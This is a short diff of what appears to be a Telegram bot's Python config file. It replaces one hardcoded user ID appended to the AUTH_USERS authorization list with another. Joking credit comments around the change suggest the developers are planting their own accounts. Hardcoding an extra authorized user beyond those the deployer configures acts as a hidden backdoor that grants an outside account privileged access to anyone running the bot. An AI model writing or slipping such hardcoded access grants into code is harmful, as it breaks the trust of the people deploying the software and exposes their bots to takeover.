@@ -8,7 +8,7 @@ from bot.config import Config
 # dont think ne dumb (c) @Yae_X_Miko
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(5179011789)
+AUTH_USERS.append(8108281129)
 # again lol (c) @cmd_rulf 
 
 SESSION_NAME = Config.SESSION_NAME
